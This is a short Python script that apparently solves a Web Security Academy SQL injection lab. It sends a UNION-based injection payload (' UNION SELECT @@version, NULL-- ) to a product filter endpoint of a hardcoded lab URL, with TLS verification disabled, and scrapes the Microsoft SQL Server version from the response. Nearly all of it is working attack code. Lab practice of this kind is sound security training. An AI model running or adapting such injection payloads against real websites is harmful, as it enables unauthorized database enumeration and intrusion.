import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {
    "http": None, "https": None}

def extract_database_version(url):
    path = "/filter?category=Accessories"
    sqli_payload = "' UNION SELECT @@version, NULL-- "
    response = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    if response.status_code == 200:
        print("[+] Found database version:")
        soup = BeautifulSoup(response.text, "html.parser")
        version_info = soup.find_all(string=re.compile(".*Microsoft SQL Server.*"))
        if version_info:
            print("[+] The Microsoft SQL Server version is: {}".format(version_info[0]))
            return True
        else:
            print("[-] Could not find version information in the response.")
            return False
    else:
        print("[-] Could not retrieve the database version.")
        return False
    
if __name__ == "__main__":
    try:
        # target_url = sys.argv[1]
        target_url = "https://0aab005804e1a71f86a4498400da0064.web-security-academy.net/"
    except IndexError:
        print("Usage: python3 sqli-lab-08.py <target_url>")
        print("Example: python3 sqli-lab-08.py https://example.com")
        sys.exit(1)
    print("[+] Dumping the version of the database...")
    extract_database_version(target_url)
    